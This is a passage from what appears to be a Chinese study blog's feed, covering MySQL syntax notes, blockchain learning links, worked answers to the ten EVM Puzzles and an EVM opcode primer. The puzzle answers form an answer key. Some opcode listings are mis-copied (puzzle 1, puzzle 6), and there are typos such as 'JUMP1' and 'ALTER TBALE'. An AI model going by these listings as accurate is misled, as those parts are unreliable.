DATABASE[IF NOT EXISTS]数据库名[DEFAULT CHARSET 字符集] [COLLATE 排序规则]；<blockquote><p>括号代表可以有的，eg:CREATE DATABASE IF NOT EXISTS itcast DEFAULT CHARSET utf8mb4;也可以直接创建CREATE DATABASE itcast;</p></blockquote></li></ul></li><li>删除：<ul><li>DROP DATABASE[IF EXISTS]数据库名；</li></ul></li><li>使用：<ul><li>USE 数据库名；顾名思义切换到一个数据库中</li></ul></li></ul><p>b,DDL-表操作</p><ul><li>查询<ul><li>查询当前数据库所有表：SHOW TABLES;</li><li>查询表的结构：DESC 表名；</li><li>查询指定表的建表语句 SHOW CREATE TABLE 表名；</li></ul></li><li>创建<ul><li>CREATE TABLE 表名（<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段n 字段类型 COMMENT 字段n注释<br>）[COMMENT 表注释] ；<br>（注意：最后一个字段没有逗号，字段的注释必须用’’围住,可以先在记事本上写，然后直接复制）<br>mysql&gt; CREATE TABLE tb_user(<br>-&gt; id int COMMENT ‘编号’<br>-&gt; ) COMMENT ‘用户表’;</li></ul></li></ul><p>c,DDL-表操作-数据类型</p><ul><li>数值类型（参照Java）<ul><li>TINYINT(1byte)，SMALLINT(2bytes),MEDIUMINT(3bytes)，INT(4bytes),BIGINT(8bytes),FLOAT(4bytes),DOUBLE(8bytes)</li><li>有符号（SIGNED），范围有负数，无符号（UNSIGNED），范围无负数，eg:TINYINT 有符号：-128<del>127，无符号：0</del>255；</li><li>举例：年龄：age TINYINT UNSIGNED；分数：score DOUBLE(4,1)，4为标度，总共的数字个数，1为精度，小数的位数</li></ul></li><li>字符串类型<ul><li>CHAR ：定长字符串；VARCHAR：变长字符串；TEST:长文本数据；</li><li>CHAR(10),性能好；VARCHAR(10)</li></ul></li><li>日期时间类型<ul><li>DATE:范围：1000-01-01至9999-12-31，格式：YYYY-MM-DD  日期值  eg:brithday DATE</li><li>TIME:范围：-838：59：59至838：59：59，格式：HH:MM:SS  时间值</li><li>YEAR:范围：1901至2155   格式：YYYY 年份值</li><li>DATETIME:混合日期和时间 格式：YYYY-MM-DD HH-MM-SS</li><li>TIMESTAMP :混合日期和时间，时间戳 格式：YYYY-MM-DD HH-MM-SS</li></ul></li></ul><p>d,DDL-表操作-修改</p><ul><li>添加字段：ALTER TABLE 表名 ADD 字段名 类型（长度）[COMMENT 注释] [约束 ]；</li><li>修改字段<ul><li>修改数据类型 ： ALTER TBALE 表名 字段名 新数据类型（长度）；</li><li>修改字段名，字段类型 ：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度）[COMMENT 注释] [约束 ]；</li></ul></li><li>删除字段 : ALTER TABLE 表名 DROP 字段名；</li><li>修改表名 ：ALTER TABLE 表名 RENAME TO 新表名；</li><li>删除：<ul><li>删除表 ：DROP TABLE [IF EXISTS]表名；</li><li>删除指定表，并重新创建该表 : TRUNCATE TABLE 表名；（一般不使用它，因为它会重新创建该表，只是没有结构）<br>MySQL 图形化界面：DataGrip,使用它就可以直接写了</li></ul></li></ul><hr><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><p>2，DML：数据操作语言，用来对数据库表中的数据进行修改  涉及的关键字：INSERT INTO<br>a,DML-添加数据：</p><ul><li>给指定字段添加数据：INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…）；</li><li>给全部字段添加数：INSERT INTO 表名 VALUES（值1，值2…）；值1，就是表中第一列</li><li>批量添加数据：<ul><li>INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…），（值1，值2…），（值1，值2…）；</li><li>INSERT INTO 表名 VALUE(值1，值2)，（值1，值2…）（值1，值2…）；<br>b，DML-修改数据</li></ul></li><li>UPDATE 表名 SET 字段名1 &#x3D; 值1，字段名2 &#x3D; 值2，…[WHERE 条件]；<br>c,DML-删除数据</li><li>DELETE FROM 表名 [WHERE 条件]；</li></ul><hr><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><p>3，DQL：数据查询语言，用来查询数据库中的表的记录   涉及的关键字：SELECT</p><p>a,DQL-语法（也是编写顺序）：<br>SELECT<br>       字段列表<br>FROM<br>       表名列表<br>WHERE<br>       条件列表<br>GROUP BY<br>       分组字段列表<br>HAVING<br>       分组后条件列表<br>ORDER BY<br>       排序字段列表<br>LIMIT<br>       分页参数</p><p>b,DQL-基本查询</p><ul><li>查询多个字段<ul><li>SELECT 字段1，字段2，字段3…. FROM 表名；</li><li>SELECT *FROM 表名；查询所有字段</li></ul></li><li>设置别名：SELECT 字段1[AS 别名1]，字段2[AS 别名2]…FROM 表名；</li><li>去除重复记录：SELECT DISTINCT 字段列表 FROM 表名；<br>c,DQL-条件查询</li><li>语法：SELECT 字段列表 FROM 表名 WHERE 条件列表；</li><li>条件：where后面可以跟比较运算符（&gt;,&lt;,!&#x3D;,is NULL,BETWEEN    AND ，IN(),LIKE 占位符 _ % ）和逻辑运算符（AND ,&amp;&amp;,OR,||,NOT,!）</li><li>in(),就是括号里的条件任意满足其一即可，between最小值 and 最大值,like 模糊匹配 下划线_占一个字符，百分号% h后跟谁查谁，最后一个字符，例如查询名字为俩个字的员工：like ‘_ _’;  例如查身份证最后一个字符为X：like ‘%x’;</li></ul><p>c,DQL-聚合函数</p><ul><li>介绍：将一列数据作为一个整体，进行纵向计算</li><li>常见的聚合函数<ul><li>count ：统计数量</li><li>max :最大值</li><li>min : 最小值</li><li>avg : 平均值</li><li>sum : 求和</li></ul></li><li>语法<ul><li>SELECT 聚合函数（字段列表）FROM 表名；</li></ul></li></ul><p>d,DQL-分组查询</p><ul><li>语法：SELECT 字段列表 FROM 表名[WHERE 条件] GROUP BY 分组字段名 [HAVING 分组后过滤条件]；</li><li>where与having区别：<ul><li>执行时机不同：where是分组前进行过滤，不满足where条件，不参与分组；而having是分组后对结果进行过滤</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以；</li><li>注意事项：执行顺序：where&gt;聚合函数&gt;having; 分组后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul></li></ul><p>e,DQL-排序查询</p><ul><li>语法: SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2，排序方式二；</li><li>排序方式：<ul><li>ASC: 升序（默认值）</li><li>DESC: 降序</li></ul></li></ul><p>f,DQL-分页查询</p><ul><li>语法：SELECT 字段列表 FROM 表名 LIMIT 起始索引，查询记录数；</li><li>注意：<ul><li>起始索引从零开始，起始索引 &#x3D; （查询页码-1）*每页显示记录数</li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中式LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接写limit 10</li></ul></li></ul><p>h,DQL-执行顺序<br> FROM<br>    表名列表<br>WHERE<br>    条件列表<br>GROUP BY<br>     分组字段列表<br>HAVING<br>     分组后条件列表<br>SELECT<br>     字段列表<br>ORDER BY<br>     排序字段列表<br>LIMIT<br>     分页参数</p><hr><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><p>4，DCL：数据控制语言，用来创建数据库用户，控制数据库的访问权限,就是控制有那些用户可以访问数据库</p><p>a,DCL-用户管理</p><ul><li>查询用户：USE mysql; SELECT *FROM user;</li><li>创建用户：CREATE USER ‘用户名‘@’主机名’ IDENTIFIED BY ‘密码’；</li><li>修改用户密码：ALTER USER ‘用户名‘@’主机名’ IDENTIFIED WITH mysql_native_password BY ‘新密码’；</li><li>删除用户：DROP USER ‘用户名‘@’主机名’；</li><li>主机名：localhost 代表只能在当前主机访问数据库，% 代表可以在任意主机上访问数据库；</li></ul><p>b,DCL-控制权限</p><ul><li>ALL ,ALL PRIVILEGES : 所有权限</li><li>SELECT : 查询数据</li><li>INSERT ：插入数据</li><li>UPDATE : 修改数据</li><li>DELETE : 删除数据</li><li>ALTER : 修改表</li><li>DROP : 删除数据库，表，视图</li><li>CREATE : 创建数据库，表</li><li>主要使用：<ul><li>查询权限：SHOW GRANTS FOR ‘用户名‘@’主机名’；</li><li>授予权限：GRANT 授权列表 ON 数据库名.表名 TO ‘用户名‘@’主机名’;</li><li>撤销权限：REVOKE 权限列表 ON 数据库名.表名 FROM ‘用户名‘@’主机名’；</li></ul></li></ul><hr><p>（由于后面要学习solidity，所以就没有再更新数据库原理了）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链入门知识常用链接</title>
      <link href="/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>推荐这个博主的整个入门区块链的方向，里面有个思维导图，值得一看.<a href="https://dukedaily.github.io/solidity-expert/cn/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html">点击</a></li><li>僵尸编程学习<a href="https://cryptozombies.io/">点击</a></li><li>WTF学院，学习 EVM ，solidity值得一看.<a href="https://www.wtf.academy/">点击</a></li><li>Ethernaut靶场练习，<a href="https://ethernaut.openzeppelin.com/">点击</a></li><li>damn-vulnerable-defi靶场练习，<a href="https://www.damnvulnerabledefi.xyz/">点击</a></li><li>EVM PUZZLES题解参考链接，<a href="https://learnblockchain.cn/article/5533">点击1</a>  <a href="https://dukedaily.github.io/solidity-expert/cn/09_EVM%E8%AF%A6%E8%A7%A3/02-evm-puzzles.html">点击二</a></li><li>evm code指令速查 <a href="https://www.evm.codes/?fork=shanghai">点击</a></li><li>注:自毁函数将会被弃用,<a href="https://eips.ethereum.org/EIPS/eip-4758">点击1</a>,<a href="https://eips.ethereum.org/EIPS/eip-6049">点击2</a></li><li><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">闪电贷的极简入门</a></li><li>关于solidity的一些基本问题,用于自查，<a href="https://www.rareskills.io/post/solidity-interview-questions">点击</a></li><li>将本地文件上传到github上，<blockquote><p>要有一个自己想上传的仓库，<br>cd 要上传的文件名，git remote add origin (ssh下的仓库地址)，<br>切换分支，主要是看仓库是master,还是main, 还是其他的分支，git branch -M main , 切换到main分支上<br>直接上传到分支上 git push -u origin main<br>即可</p></blockquote></li></ul><p>一些智能的工具：<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>谷歌开发的一个智能软件：<a href="https://gemini.google.com/app">Gemini</a>；<br>一个社区的检索问题：<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>一个社区的全球交流平台：<a href="https://stackoverflow.com/">stackoverflow</a>;<br>web一个知识构建平台：<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p><p><a href="https://www.rareskills.io/post/solidity-interview-questions">solidityquestion</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM puzzle</title>
      <link href="/2024/08/30/EVM-puzzle/"/>
      <url>/2024/08/30/EVM-puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-PUZZLE"><a href="#EVM-PUZZLE" class="headerlink" title="EVM PUZZLE"></a>EVM PUZZLE</h1><p><a href="https://github.com/fvictorio/evm-puzzles">运行游戏</a></p><h2 id="puzzle-1-CALLVALUE"><a href="#puzzle-1-CALLVALUE" class="headerlink" title="puzzle 1 CALLVALUE"></a>puzzle 1 CALLVALUE</h2><p>题目：</p><pre>pc     opcode  opcode name01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>输入恰当的value，使得题目的 opcode 正确执行，直到执行STOP</p><p>分析：CALLVALUE实际上就是msg.value,它会将msg.value存储到栈顶,而JUMP会读取栈顶值，并跳转到相应的字节地址，由JUMPDEST承接,所以我们只需要让msg.value&#x3D;&#x3D;8即可</p><hr><h2 id="puzzles-2-CODESIZE"><a href="#puzzles-2-CODESIZE" class="headerlink" title="puzzles 2 CODESIZE"></a>puzzles 2 CODESIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>msg.value是多少？</p><p>分析：CALLVALUE存储值到栈顶，STACK：[x]，CODESIZE获取当前EVM环境中的操作码SIZE，每个OPCODE为1byte，我们此时内存中共10个操作码，因此执行CODESIZE后，会向栈顶存入10，STACK：[10, x]，SUB会执行减法操作，并将结果如栈，STACK：[10 - x]<br>JUMP会跳到06字节，因此我们需要 10 - x &#x3D; 6，推导出：x &#x3D; 4，即msg.value为4</p><hr><h2 id="puzzles-3-CALLDATASIZE"><a href="#puzzles-3-CALLDATASIZE" class="headerlink" title="puzzles 3 CALLDATASIZE"></a>puzzles 3 CALLDATASIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      36      CALLDATASIZE01      56      JUMP02      FD      REVERT03      FD      REVERT04      5B      JUMPDEST05      00      STOP</pre><p>calldata是多少？</p><p>分析：JUMPDEST跳转到04，所以我们只要保证calldata到size为4即可，内容不限。即len(msg.data) &#x3D;&#x3D; 4,msg.data&#x3D;&#x3D;0x11223344</p><blockquote><p>补充：一个字节代表8位二进制数，一个16进制数代表4位二进制数，所以俩个16进制的数就代表一个字节</p></blockquote><hr><h2 id="puzzles-4-XOR"><a href="#puzzles-4-XOR" class="headerlink" title="puzzles 4 XOR"></a>puzzles 4 XOR</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      18      XOR03      56      JUMP04      FD      REVERT05      FD      REVERT06      FD      REVERT07      FD      REVERT08      FD      REVERT09      FD      REVERT0A      5B      JUMPDEST0B      00      STOP</pre><p>value是多少？</p><p>分析:CALLVALUE获取数值后入栈，STACK：[x],CODESIZE获取数值为12入栈，STACK：[12, x]<br>异或操作：<br>12：0000，1100<br>0A：0000，1010<br>x： 0000，0110 &#x3D;》6，所以答案为：6,即value为6</p><hr><h2 id="puzzles-5-JUPM1"><a href="#puzzles-5-JUPM1" class="headerlink" title="puzzles 5 JUPM1"></a>puzzles 5 JUPM1</h2><p>题目：</p><pre>        pc      opcode      opcode name00      34          CALLVALUE01      80          DUP102      02          MUL03      610100      PUSH2 010006      14          EQ07      600C        PUSH1 0C09      57          JUMPI0A      FD          REVERT0B      FD          REVERT0C      5B          JUMPDEST0D      00          STOP0E      FD          REVERT0F      FD          REVERT</pre><p>value是多少？</p><p>分析：</p><ul><li>CALLVALUE，STACK-&gt; [x]</li><li>DUP1：STACK-&gt; [x，x]</li><li>MUL：STACK-&gt; [mul_result]</li><li>PUSH2 0100：STACK-&gt; [0100，mul_result]</li><li>EQ：判断stack1和stack2是否相等，若相等，则清除这两个值，并向栈顶存入1，否则存入0</li><li>PUSH1 0C：STACK-&gt; [0C, 1]</li><li>JUMPI：读取stack2的值，如果为1，则跳转到stack1的位置，即0C，满足条件！<br>因此我们需要使得：0100 &#x3D; x*x，0x0100十进制为256，所以x &#x3D; 16，即value为16</li></ul><hr><h2 id="puzzles-6-CALLDATALOAD"><a href="#puzzles-6-CALLDATALOAD" class="headerlink" title="puzzles 6 CALLDATALOAD"></a>puzzles 6 CALLDATALOAD</h2><p>题目：</p><pre>pc      opcode  opcode name02      35        CALLDATALOAD04      FD        REVERT05      FD        REVERT06      FD        REVERT07      FD        REVERT08      FD        REVERT09      FD        REVERT0A      5B        JUMPDEST0B      00        STOP</pre><p>calldataload是 多少？</p><p>分析：</p><ul><li>PUSH1 00，STACK：【0x00】</li><li>CALLDATALOAD：获取input的数据，即calldata，参数为0x00，即从第00位置开始加载</li><li>JUMP想跳转到0A处，所以calldata的值为0x0a，如果我们直接输入0x0a，此时会被转化为：a00000000000000000000000000000000000000000000000000000000000000，这是错的；</li><li>由于calldata的数值总为32字节的倍数，所以此处应该为：0x000000000000000000000000000000000000000000000000000000000000000a</li></ul><hr><h2 id="puzzles-7-EXTCODESIZE"><a href="#puzzles-7-EXTCODESIZE" class="headerlink" title="puzzles 7 EXTCODESIZE"></a>puzzles 7 EXTCODESIZE</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      3B        EXTCODESIZE0C      6001      PUSH1 010E      14        EQ0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>calldata是多少？</p><p>分析：逐步分析，</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1        # [00, 00, datasize]04      37        CALLDATACOPY     # [] data被copy到memory中，栈被清空05      36        CALLDATASIZE    # [datasize]06      6000      PUSH1 00        # [00, datasize]08      6000      PUSH1 00        # [00, 00, datasize]0A      F0        CREATE    # [deployed_address] 栈被清空，从内存中读取数据，创建合约，返回地址 0B      3B        EXTCODESIZE    # [address_code_size] 输入地址，返回合约的size0C      6001      PUSH1 01    # [01, address_code_size]0E      14        EQ    # [1] address_code_size必须为1，后续的才成立0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>就是我们传入的数据要的操作码要返回1，利用return操作符</p><pre>pc      opcode    opcode name00      6001      PUSH1 0104      F3        RETURN</pre><p>即 msg.data &#x3D;&#x3D; 0x60016000f3</p><hr><h2 id="puzzles-8-SWAP"><a href="#puzzles-8-SWAP" class="headerlink" title="puzzles 8 SWAP"></a>puzzles 8 SWAP</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      6000      PUSH1 000D      80        DUP10E      80        DUP10F      80        DUP110      80        DUP111      94        SWAP512      5A        GAS13      F1        CALL14      6000      PUSH1 0016      14        EQ17      601B      PUSH1 1B19      57        JUMPI1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>calldata是多少？<br>分析：</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1    # [00, 00, datasize]04      37        CALLDATACOPY    # []  copy到内存中05      36        CALLDATASIZE    # [datasize]，直接生成数据，不需要栈参数06      6000      PUSH1 00    # [00, datasize]08      6000      PUSH1 00    # [00, 00, datasize]0A      F0        CREATE    # [deployed_address]0B      6000      PUSH1 00    # [00, deployed_address]0D      80        DUP1    # [00, 00, deployed_address]0E      80        DUP1    # [00, 00, 00, deployed_address]0F      80        DUP1    # [00, 00, 00, 00, deployed_address]10      80        DUP1    # [00, 00, 00, 00, 00, deployed_address]11      94        SWAP5    # [deployed_address, 00, 00, 00, 00, 00]，兑换1st 和 6th，你没有看错1和6，不是512      5A        GAS    # [gasAvail, deployed_address, 00, 00, 00, 00, 00] // 7个参数13      F1        CALL    # [0或1]调用函数，需要是0，0表示失败，1表示成功！（反推的14      6000      PUSH1 00    # [00, 0或1]，需要是016      14        EQ    # [0或1]，需要是117      601B      PUSH1 1B    # [1B, 0或1]，需要是119      57        JUMPI                       1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>逐步分析后，可得知我们需要做到call调用失败，这就要我们传入的数据revert,类似于puzzles#7</p><pre>pc      opcode    opcode name00      60FD      PUSH1 FD //FD 是revert操作符的编号02      6000      PUSH1 0004      53        MSTORE805      6001      PUSH1 0107      6000      PUSH1 0009      F3        RETURN</pre><p>即calldata&#x3D; 0x60fd60005360016000f3</p><hr><h2 id="puzzles-9-LT"><a href="#puzzles-9-LT" class="headerlink" title="puzzles 9 LT"></a>puzzles 9 LT</h2><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6003      PUSH1 0303      10        LT04      6009      PUSH1 0906      57        JUMPI07      FD        REVERT08      FD        REVERT09      5B        JUMPDEST0A      34        CALLVALUE0B      36        CALLDATASIZE0C      02        MUL0D      6008      PUSH1 080F      14        EQ10      6014      PUSH1 1412      57        JUMPI13      FD        REVERT14      5B        JUMPDEST15      00        STOP</pre><p>value?<br>calldata?</p><p>分析：就是一个推理题，00-09:datasize&gt;3,0A-12:value*datasize&#x3D;8,datasize&#x3D;4,value&#x3D;2<br>calldata的字节数为4，随意构造calldata&#x3D;0x12345678</p><hr><h2 id="puzzles-10-ISZERO"><a href="#puzzles-10-ISZERO" class="headerlink" title="puzzles 10 ISZERO"></a>puzzles 10 ISZERO</h2><p>题目：</p><pre>pc      opcode      opcode name00      38          CODESIZE01      34          CALLVALUE02      90          SWAP103      11          GT04      6008        PUSH1 0806      57          JUMPI07      FD          REVERT08      5B          JUMPDEST09      36          CALLDATASIZE0A      610003      PUSH2 00030D      90          SWAP10E      06          MOD0F      15          ISZERO10      34          CALLVALUE11      600A        PUSH1 0A13      01          ADD14      57          JUMPI15      FD          REVERT16      FD          REVERT17      FD          REVERT18      FD          REVERT19      5B          JUMPDEST1A      00          STOP</pre><p>value?<br>calldata?</p><p>分析：00-06：value&lt;23;09-0f:calldata mod 3&#x3D;&#x3D;0;10-14:value+0a&#x3D;19,注意19为16进制的数，value&#x3D;15,calldata的字节数为3，随意构造calldta&#x3D;0x123456</p><p>10道EVM puzzles就完成了！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM入门</title>
      <link href="/2024/08/19/EVM%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/19/EVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h2><p>Opcodes（操作码）是以太坊智能合约的基本单元。我们写的Solidity智能合约会被编译为字节码（bytecode），然后才能在EVM（以太坊虚拟机）上运行。而字节码就是由一系列Opcodes组成的。当用户在EVM中调用这个智能合约的函数时，EVM会解析并执行这些Opcodes，以实现合约逻辑。</p><h2 id="常见的Opcodes"><a href="#常见的Opcodes" class="headerlink" title="常见的Opcodes"></a>常见的Opcodes</h2><p><code>PUSH1</code>: 将一个字节的数据压入堆栈。例如，PUSH1 0x60 就是将 0x60 压入堆栈。<br><code>DUP1</code> : 复制堆栈顶部的一个元素。<br><code>SWAP1</code>: 交换堆栈顶部的前两个元素。</p><p>例如：下面是一个简单的Solidity智能合约，它只有一个add()函数，计算1+1的结果并返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Add &#123;</span><br><span class="line">    function add() public pure returns (uint256 result) &#123;</span><br><span class="line">        result = 1+1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译后，我们可以得到合约对应的bytecode:<strong>60806040523480156100…</strong></p><p>通过bytecode，我们可以得到合约对应的opcodes为:<strong>PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 …</strong></p><blockquote><p>我认为需要特别记忆的基本Opcodes:<br>PUSH1:将一个长度为1字节的数据压入堆栈顶部。同理可知：PUSH2就是压入长度为俩个字节的数据进入栈堆顶部<br>ADD:会弹出堆栈顶部的两个元素，计算它们的和，然后将结果压入堆栈。<br>PUSH0:就是将0压入栈堆<br>MUL: 会弹出堆栈顶部的两个元素，计算它们的乘，然后将结果压入堆栈。<br>SUB: 会弹出堆栈顶部的两个元素，第二个元素减去第一个元素，然后将结果压入堆栈<br>DUPx:就是复制第x个元素到栈顶<br>LT:从堆栈中弹出两个元素，比较第二个元素是否小于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>GT:从堆栈中弹出两个元素，比较第二个元素是否大于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>EQ:从堆栈中弹出两个元素，比较第二个元素是否等于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>AND:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是2<br>OR:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是3<br>XOR:它是异或运算,,如2(0000 0010)和3(0000 0011),则入栈的是1(0000 0001),就是比较依次它们2进制的数,俩个0相遇或者俩个1相遇就为0,不同的相遇就为1<br>SHL:指令执行左移位操作，从堆栈中弹出两个元素，将第二个元素左移第一个元素位数，然后将结果推回栈顶。将2（0000 0010）和3（0000 0011）推入堆栈，然后将2左移3位，结果应该为16（0001 0000）。<br>SHR:同上,只不过向右移,字节码将16（0001 0000）和3（0000 0011）推入堆栈，然后将16右移3位，结果应该为2（0000 0010）。<br>MSTORE:指令用于将一个256位（32字节）的值存储到内存中。它从堆栈中弹出两个元素，第一个元素为内存的地址（偏移量 offset），第二个元素为存储的值（value）。<br>STOP:它的作用是停止当前上下文的执行，并成功退出。<br>JUMP:用于无条件跳转到一个新的程序计数器位置。它从堆栈中弹出一个元素，将这个元素设定为新的程序计数器（pc）的值。搭配JUMPDEST(标记一个有效的跳转目标位置)使用<br>JUMP1:用于条件跳转，它从堆栈中弹出两个元素，如果第二个元素（条件，condition）不为0，那么将第一个元素（目标，destination）设定为新的pc的值。<br>SWAP:交换,如SWAP1,交换栈顶与次栈顶,swap2,交换栈顶与第三个元素<br>CALLDATALOAD:从交易或合约调用的data字段加载数据。它从堆栈中弹出calldata的偏移量（offset），然后从calldata的offset位置读取32字节的数据并压入堆栈。如果calldata剩余不足32字节，则补0。<br>CALLDATASIZE:获取交易或合约调用的data字段的字节长度，并压入堆栈。<br>CALLDATACOPY:将data中的数据复制到内存中。它会从堆栈中弹出3个参数(mem_offset, calldata_offset, length)，分别对应写到内存的偏移量，读取calldata的偏移量和长度。<br>CODESIZE:获取当前合约代码的字节长度，然后压入堆栈。</p></blockquote><hr><h2 id="EVM基础"><a href="#EVM基础" class="headerlink" title="EVM基础"></a>EVM基础</h2><p>以太坊虚拟机（EVM）是以太坊区块链中的关键组件，充当开发人员的虚拟计算机或软件平台。这项创新允许创建和部署去中心化应用程序（DApp）以及在以太坊网络上执行智能合约。 EVM 由Vitalik Buterin于 2013 年提出概念，成为以太坊网络的核心，强调了其在决定以太坊区块链中每个区块的状态方面的基础作用。</p><p>EVM就是一个运行环境，就如同Java的运行环境一样，含义，分类都差不多，它包括了堆栈，内存，存储，EVM字节码，有一点编程基础的都知道堆栈，这种先进后出的结构，反正就是一个类似于JVM一样机器，它主要就是运行一些操作符opcode,真正的要理解熟悉opcode操作符，144个，<a href="https://www.evm.codes/?fork=shanghai">点击学习</a>,更多的详细指令参考<a href="https://www.wtf.academy/docs/evm-opcodes-101/">WTF</a>，我就不一一讲了，接下来就是大白话：</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>跨区块链支持：EVM 支持字节码兼容的智能合约的能力使其能够跨各种区块链。 Polygon 和 Avalanche 等多个区块链都利用了此功能，使它们能够利用 EVM 强大的生态系统。</li><li>隔离沙箱环境：EVM 在同一计算机网络内单独操作每个代码段，确保一个应用程序的执行不会影响区块链的其余部分或节点计算机上存储的数据。这种隔离有利于快速高效的开发。</li><li>灵活的开发能力：EVM 擅长执行复杂且定制的智能合约，这对于包括 dApp、 DeFi平台、游戏和NFT在内的各种应用程序至关重要。此外，EVM 周围有一个庞大的开发人员社区，简化了软件构建过程。</li><li>跨操作系统的交叉兼容性：由于区块链网络中 MacOS、Windows 等操作系统的多样性，开发兼容软件可能具有挑战性。 EVM 通过标准化并支持跨多个操作系统执行程序来解决这个问题，而无需单独的代码库。</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>高交易成本（Gas 费） ：使用 EVM 最显着的缺点之一是加密 Gas费成本高昂。由于 EVM 的可扩展性限制，这些费用可能会迅速增加，尤其是在网络流量较高的时期。</li><li>可扩展性挑战：EVM 每秒只能处理有限数量的事务。这种限制可能会导致网络拥塞加剧，进一步推高汽油费。<br>部署智能合约的成本：以太坊的流行性质意味着部署自定义智能合约或更大的应用程序可能会成本高昂。开发人员必须优化其合约以提高效率，消除冗余代码或不必要的功能，并且还必须考虑以太坊区块链上的高存储成本。</li><li>智能合约的不可逆性：一旦部署，区块链上的智能合约就无法更改。如果在部署后发现错误或漏洞，则这种不变性会带来挑战，需要重新部署整个合约，这可能会产生额外的成本。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compound</title>
      <link href="/2024/08/19/Compound/"/>
      <url>/2024/08/19/Compound/</url>
      
